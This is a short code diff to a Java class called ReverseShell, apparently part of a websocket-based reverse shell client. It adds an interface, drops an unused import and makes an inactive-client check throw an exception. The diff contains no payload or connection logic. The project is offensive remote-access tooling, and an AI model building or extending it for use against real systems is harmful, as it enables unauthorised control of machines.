@@ -1,9 +1,9 @@
 package com.mtattab.reverseshell.service.impl;
 
+import com.mtattab.reverseshell.service.WebsocketReverseShellService;
 import com.mtattab.reverseshell.util.Constants;
 import lombok.Data;
 import lombok.extern.java.Log;
-import org.apache.tomcat.util.bcel.classfile.Constant;
 import org.eclipse.jetty.util.ssl.SslContextFactory;
 import org.eclipse.jetty.websocket.api.Session;
 import org.eclipse.jetty.websocket.client.ClientUpgradeRequest;
@@ -17,7 +17,7 @@ import java.util.concurrent.Future;
 
 @Data
 @Log
-public class ReverseShell {
+public class ReverseShell implements WebsocketReverseShellService {
 
     WebSocketClient client;
 
@@ -89,8 +89,9 @@ public class ReverseShell {
             log.info("Client is active");
             return true;
         }else {
-            log.warning("Client is not active");
-            return false;
+            log.severe("Client is not active");
+            log.info("please activate the client");
+            throw new RuntimeException("Client is not instantiated.");
         }
     }
 
